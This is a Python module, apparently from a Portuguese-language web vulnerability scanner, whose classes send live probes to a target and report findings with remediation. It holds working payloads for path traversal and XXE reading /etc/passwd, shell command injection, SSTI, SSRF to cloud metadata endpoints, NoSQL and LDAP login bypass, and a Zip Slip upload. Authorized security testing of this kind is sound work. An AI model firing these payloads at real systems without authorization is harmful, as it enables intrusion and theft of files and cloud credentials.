# -*- coding: utf-8 -*-
"""
Testers de injeção ativa: path traversal, command injection, XXE, SSTI,
NoSQLi, LDAP injection, HTML injection, indícios de deserialização insegura
e Zip Slip. Mesmo padrão de modules/ai/exploit_tester.py — envia payloads
reais contra o alvo. Use apenas contra alvos com autorização explícita.
"""

import io
import re
import time
import zipfile
from typing import Any, Dict, List
from urllib.parse import urljoin

from core.config import Config
from core.http_client import HTTPClient
from core.logger import get_logger
from ._param_discovery import collect_targets
from .active_scanner import Finding, ScanResult

logger = get_logger(__name__)

TRAVERSAL_PARAMS = {'file', 'path', 'page', 'doc', 'document', 'template', 'include', 'filename'}
TRAVERSAL_PAYLOADS = [
    '../../../../../../etc/passwd',
    '..%2f..%2f..%2f..%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '../../../../../../windows/win.ini',
]
TRAVERSAL_SIGNATURES = ['root:x:0:0:', 'daemon:x:', '[fonts]', '[extensions]']

CMDI_PAYLOADS = ['; id', '| id', '`id`', '$(id)', '; whoami', '| whoami']
CMDI_SIGNATURES = [re.compile(r'uid=\d+.*gid=\d+'), re.compile(r'\bwww-data\b'), re.compile(r'\broot\b\s*$', re.M)]
CMDI_TIME_PAYLOAD = '; sleep 5'
CMDI_TIME_BASELINE_PAYLOAD = '; sleep 0'

SSTI_PAYLOADS = {'{{7*7}}': '49', '${7*7}': '49', '#{7*7}': '49', '<%= 7*7 %>': '49'}
SSTI_TIME_PAYLOAD = "{{ ''.__class__.__mro__[1].__subclasses__() and '' }}{% for i in range(100000000) %}{% endfor %}"
SSTI_TIME_BASELINE_PAYLOAD = 'mao_de_deus_ssti_baseline'

SSRF_PARAMS = {'url', 'uri', 'link', 'callback', 'webhook', 'image', 'image_url',
               'avatar', 'src', 'source', 'target', 'redirect', 'return', 'next', 'fetch', 'proxy'}
SSRF_METADATA_TARGETS = [
    ('AWS/GCP IMDS', 'http://169.254.169.254/latest/meta-data/', re.compile(r'ami-id|instance-id|hostname', re.I)),
    ('GCP Metadata', 'http://169.254.169.254/computeMetadata/v1/', re.compile(r'computeMetadata|project', re.I)),
    ('Azure IMDS', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
     re.compile(r'"compute"|azEnvironment', re.I)),
]

NOSQLI_PAYLOADS = [
    {"$gt": ""}, {"$ne": None}, {"$where": "1==1"},
]
NOSQLI_STRING_PAYLOADS = ["admin' || '1'=='1", "' || 1==1//"]

LDAP_PAYLOADS = ['*)(uid=*))(|(uid=*', '*)(|(objectclass=*)', '*)(&)']

HTML_INJECTION_PAYLOAD = '<b style="color:red">mao-de-deus-htmli-test</b>'

SERIALIZED_SIGNATURES = [
    (re.compile(r'^rO0'), 'Java (rO0 magic bytes)'),
    (re.compile(r'^O:\d+:"'), 'PHP (objeto serializado)'),
    (re.compile(r'^\x80[\x02-\x05]'), 'Python pickle'),
]


class PathTraversalTester:
    """Testa path traversal em parâmetros que sugiram leitura de arquivo."""

    def __init__(self, target: str, http_client: HTTPClient = None, max_params: int = 10):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.max_params = max_params
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[PathTraversal] Iniciando scan: {self.target}")
        try:
            targets = collect_targets(self.target, self.http_client, self.max_params)
            for t in targets:
                if t['param'] not in TRAVERSAL_PARAMS:
                    continue
                for payload in TRAVERSAL_PAYLOADS:
                    resp = self.http_client.get(t['base_url'], params={t['param']: payload},
                                                 timeout=6, raise_for_status=False)
                    if resp and any(sig in resp.text.lower() for sig in TRAVERSAL_SIGNATURES):
                        self.findings.append(Finding(
                            type='PATH_TRAVERSAL', severity='CRITICAL',
                            title=f'Path Traversal em parâmetro "{t["param"]}"',
                            description=f'O payload em "{t["param"]}" retornou conteúdo de arquivo do sistema.',
                            details={'param': t['param'], 'payload': payload},
                            evidence=[payload],
                            remediation='Validar/normalizar paths; usar allowlist de arquivos permitidos.',
                            affected_url=t['base_url'],
                        ))
                        break

            return ScanResult(
                scanner_name='PathTraversalTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[PathTraversal] Erro: {e}")
            return ScanResult(
                scanner_name='PathTraversalTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class CommandInjectionTester:
    """Testa command injection por reflexão de saída de shell e por time-based blind."""

    def __init__(self, target: str, http_client: HTTPClient = None, max_params: int = 10):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.max_params = max_params
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[CommandInjection] Iniciando scan: {self.target}")
        try:
            targets = collect_targets(self.target, self.http_client, self.max_params)
            for t in targets:
                base_url, param = t['base_url'], t['param']
                found = False
                for payload in CMDI_PAYLOADS:
                    resp = self.http_client.get(base_url, params={param: payload}, timeout=6, raise_for_status=False)
                    if resp and any(sig.search(resp.text) for sig in CMDI_SIGNATURES):
                        self.findings.append(Finding(
                            type='COMMAND_INJECTION_ECHO', severity='CRITICAL',
                            title=f'Command Injection (saída refletida) em "{param}"',
                            description=f'O payload em "{param}" produziu saída típica de comando de shell.',
                            details={'param': param, 'payload': payload}, evidence=[payload],
                            remediation='Nunca passar entrada do usuário para shell; usar APIs sem shell=True.',
                            affected_url=base_url,
                        ))
                        found = True
                        break

                if not found:
                    t0 = time.time()
                    self.http_client.get(base_url, params={param: CMDI_TIME_BASELINE_PAYLOAD},
                                          timeout=8, raise_for_status=False)
                    baseline = time.time() - t0

                    t0 = time.time()
                    self.http_client.get(base_url, params={param: CMDI_TIME_PAYLOAD},
                                          timeout=8, raise_for_status=False)
                    delayed = time.time() - t0

                    if delayed - baseline > 4:
                        self.findings.append(Finding(
                            type='COMMAND_INJECTION_BLIND_TIME', severity='CRITICAL',
                            title=f'Possível Command Injection (time-based) em "{param}"',
                            description=f'"sleep 5" em "{param}" atrasou a resposta em {delayed - baseline:.1f}s.',
                            details={'param': param, 'delay': delayed - baseline},
                            evidence=[CMDI_TIME_PAYLOAD],
                            remediation='Nunca passar entrada do usuário para shell; usar APIs sem shell=True.',
                            affected_url=base_url,
                        ))

            return ScanResult(
                scanner_name='CommandInjectionTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[CommandInjection] Erro: {e}")
            return ScanResult(
                scanner_name='CommandInjectionTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class SSRFTester:
    """Testa SSRF injetando URLs de metadados de nuvem (AWS/GCP/Azure) em parâmetros que aceitam URLs."""

    def __init__(self, target: str, http_client: HTTPClient = None, max_params: int = 10):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.max_params = max_params
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[SSRF] Iniciando scan: {self.target}")
        try:
            targets = collect_targets(self.target, self.http_client, self.max_params)
            for t in targets:
                if t['param'].lower() not in SSRF_PARAMS:
                    continue
                base_url, param = t['base_url'], t['param']
                for service, payload_url, signature in SSRF_METADATA_TARGETS:
                    resp = self.http_client.get(base_url, params={param: payload_url},
                                                 timeout=8, raise_for_status=False)
                    if resp and signature.search(resp.text):
                        self.findings.append(Finding(
                            type='SSRF_CLOUD_METADATA', severity='CRITICAL',
                            title=f'SSRF confirmado contra metadados de nuvem ({service}) via "{param}"',
                            description=f'O parâmetro "{param}" buscou {payload_url} e a resposta contém '
                                        f'dados típicos de metadados de instância ({service}).',
                            details={'param': param, 'service': service, 'payload': payload_url},
                            evidence=[resp.text[:200]],
                            remediation='Bloquear requisições server-side a 169.254.169.254 e validar/whitelistar destinos.',
                            affected_url=base_url,
                        ))
                        break

            return ScanResult(
                scanner_name='SSRFTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[SSRF] Erro: {e}")
            return ScanResult(
                scanner_name='SSRFTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class XXETester:
    """Envia corpo XML com entidade externa em endpoints que aceitam XML."""

    XXE_PAYLOAD = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<data>&xxe;</data>'
    )
    SIGNATURES = ['root:x:0:0:', 'daemon:x:']

    def __init__(self, target: str, http_client: HTTPClient = None):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[XXE] Iniciando scan: {self.target}")
        try:
            for content_type in ('application/xml', 'text/xml'):
                resp = self.http_client.post(
                    self.target, data=self.XXE_PAYLOAD,
                    headers={'Content-Type': content_type}, timeout=8, raise_for_status=False,
                )
                if resp and any(sig in resp.text.lower() for sig in self.SIGNATURES):
                    self.findings.append(Finding(
                        type='XXE_INJECTION', severity='CRITICAL',
                        title='XML External Entity (XXE) injection',
                        description=f'O endpoint processou entidade externa e vazou conteúdo de arquivo local '
                                    f'(Content-Type: {content_type}).',
                        details={'content_type': content_type}, evidence=[self.XXE_PAYLOAD],
                        remediation='Desabilitar resolução de entidades externas no parser XML.',
                        affected_url=self.target,
                    ))
                    break

            return ScanResult(
                scanner_name='XXETester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[XXE] Erro: {e}")
            return ScanResult(
                scanner_name='XXETester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class SSTITester:
    """Testa Server-Side Template Injection via payloads matemáticos refletidos."""

    def __init__(self, target: str, http_client: HTTPClient = None, max_params: int = 10):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.max_params = max_params
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[SSTI] Iniciando scan: {self.target}")
        try:
            targets = collect_targets(self.target, self.http_client, self.max_params)
            for t in targets:
                for payload, expected in SSTI_PAYLOADS.items():
                    resp = self.http_client.get(t['base_url'], params={t['param']: payload},
                                                 timeout=6, raise_for_status=False)
                    if resp and expected in resp.text and payload not in resp.text:
                        self.findings.append(Finding(
                            type='SSTI', severity='CRITICAL',
                            title=f'Server-Side Template Injection em "{t["param"]}"',
                            description=f'O payload "{payload}" foi avaliado como expressão ({expected} na resposta).',
                            details={'param': t['param'], 'payload': payload}, evidence=[payload],
                            remediation='Nunca renderizar input do usuário como template; usar sandboxing.',
                            affected_url=t['base_url'],
                        ))
                        break
                else:
                    t0 = time.time()
                    self.http_client.get(t['base_url'], params={t['param']: SSTI_TIME_BASELINE_PAYLOAD},
                                          timeout=8, raise_for_status=False)
                    baseline = time.time() - t0

                    t0 = time.time()
                    self.http_client.get(t['base_url'], params={t['param']: SSTI_TIME_PAYLOAD},
                                          timeout=8, raise_for_status=False)
                    delayed = time.time() - t0

                    if delayed - baseline > 4:
                        self.findings.append(Finding(
                            type='SSTI_BLIND_TIME', severity='CRITICAL',
                            title=f'Possível Blind SSTI (time-based) em "{t["param"]}"',
                            description=f'Payload de loop pesado em "{t["param"]}" atrasou a resposta em '
                                        f'{delayed - baseline:.1f}s, indicando avaliação do template.',
                            details={'param': t['param'], 'delay': delayed - baseline},
                            evidence=[SSTI_TIME_PAYLOAD],
                            remediation='Nunca renderizar input do usuário como template; usar sandboxing ou logic-less templates.',
                            affected_url=t['base_url'],
                        ))

            return ScanResult(
                scanner_name='SSTITester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[SSTI] Erro: {e}")
            return ScanResult(
                scanner_name='SSTITester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class NoSQLiTester:
    """Testa NoSQL injection em endpoints JSON de login/busca (ex.: MongoDB)."""

    LOGIN_FIELDS = [('username', 'password'), ('email', 'password'), ('user', 'pass')]

    def __init__(self, target: str, http_client: HTTPClient = None):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[NoSQLi] Iniciando scan: {self.target}")
        try:
            for user_field, pass_field in self.LOGIN_FIELDS:
                for payload in NOSQLI_PAYLOADS:
                    body = {user_field: 'admin', pass_field: payload}
                    resp = self.http_client.post(self.target, json=body, timeout=6, raise_for_status=False)
                    if resp and resp.status_code == 200 and \
                            any(k in resp.text.lower() for k in ('token', 'welcome', 'dashboard', 'success')):
                        self.findings.append(Finding(
                            type='NOSQL_INJECTION', severity='CRITICAL',
                            title=f'Possível NoSQL Injection em "{pass_field}"',
                            description='Operador NoSQL ($gt/$ne/$where) em JSON body pareceu autenticar com sucesso.',
                            details={'field': pass_field, 'payload': payload}, evidence=[str(payload)],
                            remediation='Validar tipo dos campos (rejeitar objetos onde se espera string).',
                            affected_url=self.target,
                        ))
                        return self._finish(start_time)

                for payload in NOSQLI_STRING_PAYLOADS:
                    body = {user_field: payload, pass_field: payload}
                    resp = self.http_client.post(self.target, json=body, timeout=6, raise_for_status=False)
                    if resp and resp.status_code == 200 and \
                            any(k in resp.text.lower() for k in ('token', 'welcome', 'dashboard', 'success')):
                        self.findings.append(Finding(
                            type='NOSQL_INJECTION', severity='CRITICAL',
                            title=f'Possível NoSQL Injection (string) em "{user_field}"',
                            description='Payload de injeção NoSQL em string pareceu autenticar com sucesso.',
                            details={'field': user_field, 'payload': payload}, evidence=[payload],
                            remediation='Usar prepared queries/ODM com validação de esquema estrita.',
                            affected_url=self.target,
                        ))
                        return self._finish(start_time)

            return self._finish(start_time)
        except Exception as e:
            logger.error(f"[NoSQLi] Erro: {e}")
            return ScanResult(
                scanner_name='NoSQLiTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )

    def _finish(self, start_time: float) -> ScanResult:
        return ScanResult(
            scanner_name='NoSQLiTester', target=self.target,
            findings=self.findings, execution_time=time.time() - start_time, success=True,
        )


class LDAPInjectionTester:
    """Testa LDAP injection em campos de busca/login."""

    def __init__(self, target: str, http_client: HTTPClient = None, max_params: int = 10):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.max_params = max_params
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[LDAPInjection] Iniciando scan: {self.target}")
        try:
            targets = collect_targets(self.target, self.http_client, self.max_params)
            baseline_texts: Dict[str, str] = {}
            for t in targets:
                base_url, param = t['base_url'], t['param']
                baseline = self.http_client.get(base_url, params={param: 'nonexistent_user_xyz'},
                                                 timeout=6, raise_for_status=False)
                baseline_text = baseline.text if baseline else ''

                for payload in LDAP_PAYLOADS:
                    resp = self.http_client.get(base_url, params={param: payload}, timeout=6, raise_for_status=False)
                    if resp and resp.status_code == 200 and len(resp.text) > 50 and \
                            resp.text != baseline_text and len(resp.text) > len(baseline_text) * 1.2:
                        self.findings.append(Finding(
                            type='LDAP_INJECTION', severity='HIGH',
                            title=f'Possível LDAP Injection em "{param}"',
                            description=f'Payload de wildcard LDAP em "{param}" alterou significativamente a resposta.',
                            details={'param': param, 'payload': payload}, evidence=[payload],
                            remediation='Escapar caracteres especiais de LDAP (*, (, ), \\, NUL) na entrada.',
                            affected_url=base_url,
                        ))
                        break

            return ScanResult(
                scanner_name='LDAPInjectionTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[LDAPInjection] Erro: {e}")
            return ScanResult(
                scanner_name='LDAPInjectionTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class HTMLInjectionTester:
    """Testa injeção de HTML simples (sem script) refletido na resposta."""

    def __init__(self, target: str, http_client: HTTPClient = None, max_params: int = 10):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.max_params = max_params
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[HTMLInjection] Iniciando scan: {self.target}")
        try:
            targets = collect_targets(self.target, self.http_client, self.max_params)
            for t in targets:
                resp = self.http_client.get(t['base_url'], params={t['param']: HTML_INJECTION_PAYLOAD},
                                             timeout=6, raise_for_status=False)
                if resp and HTML_INJECTION_PAYLOAD in resp.text:
                    self.findings.append(Finding(
                        type='HTML_INJECTION', severity='MEDIUM',
                        title=f'HTML Injection em parâmetro "{t["param"]}"',
                        description=f'Tags HTML injetadas em "{t["param"]}" foram refletidas sem escape.',
                        details={'param': t['param']}, evidence=[HTML_INJECTION_PAYLOAD],
                        remediation='Escapar output HTML (htmlspecialchars/autoescape do template engine).',
                        affected_url=t['base_url'],
                    ))

            return ScanResult(
                scanner_name='HTMLInjectionTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[HTMLInjection] Erro: {e}")
            return ScanResult(
                scanner_name='HTMLInjectionTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class InsecureDeserializationTester:
    """Detecta cookies/parâmetros com padrão de objeto serializado (indício, não RCE automático)."""

    def __init__(self, target: str, http_client: HTTPClient = None):
        self.target = target
        self.http_client = http_client or HTTPClient()
        self.findings: List[Finding] = []

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[InsecureDeserialization] Iniciando scan: {self.target}")
        try:
            resp = self.http_client.get(self.target, timeout=Config.HTTP_TIMEOUT, raise_for_status=False)
            if resp:
                candidates: Dict[str, str] = {}
                for cookie_name, cookie_val in resp.cookies.items():
                    candidates[f'cookie:{cookie_name}'] = cookie_val

                for source, value in candidates.items():
                    for pattern, label in SERIALIZED_SIGNATURES:
                        if pattern.search(value):
                            self.findings.append(Finding(
                                type='POSSIBLE_INSECURE_DESERIALIZATION', severity='MEDIUM',
                                title=f'Possível objeto serializado em {source}',
                                description=f'{source} tem formato compatível com {label}. '
                                            'Verificar manualmente se é desserializado sem validação no servidor.',
                                details={'source': source, 'format': label},
                                evidence=[value[:80]],
                                remediation='Evitar desserializar dados não confiáveis; usar formatos como JSON.',
                                affected_url=self.target,
                            ))

            return ScanResult(
                scanner_name='InsecureDeserializationTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[InsecureDeserialization] Erro: {e}")
            return ScanResult(
                scanner_name='InsecureDeserializationTester', target=self.target,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )


class ZipSlipTester:
    """Envia um ZIP com entrada de path traversal para um endpoint de upload."""

    def __init__(self, upload_url: str, http_client: HTTPClient = None, file_field: str = 'file'):
        self.upload_url = upload_url
        self.http_client = http_client or HTTPClient()
        self.file_field = file_field
        self.findings: List[Finding] = []

    def _build_malicious_zip(self) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w') as zf:
            zf.writestr('../../../../tmp/mao_de_deus_zipslip_test.txt', 'zip slip poc')
        return buf.getvalue()

    def scan(self) -> ScanResult:
        start_time = time.time()
        logger.info(f"[ZipSlip] Iniciando scan: {self.upload_url}")
        try:
            zip_bytes = self._build_malicious_zip()
            files = {self.file_field: ('poc.zip', zip_bytes, 'application/zip')}
            resp = self.http_client.post(self.upload_url, files=files, timeout=10, raise_for_status=False)
            if resp and resp.status_code in (200, 201):
                self.findings.append(Finding(
                    type='ZIP_SLIP_UPLOAD_ACCEPTED', severity='HIGH',
                    title='Upload de ZIP com path traversal foi aceito',
                    description='O servidor aceitou um ZIP com entrada "../../" — verificar manualmente se o '
                                'arquivo foi extraído fora do diretório esperado (indício, não confirmação).',
                    details={'status': resp.status_code}, evidence=['../../../../tmp/mao_de_deus_zipslip_test.txt'],
                    remediation='Validar/normalizar nomes de entrada ao extrair ZIPs; rejeitar paths com "..".',
                    affected_url=self.upload_url,
                ))

            return ScanResult(
                scanner_name='ZipSlipTester', target=self.upload_url,
                findings=self.findings, execution_time=time.time() - start_time, success=True,
            )
        except Exception as e:
            logger.error(f"[ZipSlip] Erro: {e}")
            return ScanResult(
                scanner_name='ZipSlipTester', target=self.upload_url,
                findings=self.findings, execution_time=time.time() - start_time,
                success=False, error_message=str(e),
            )
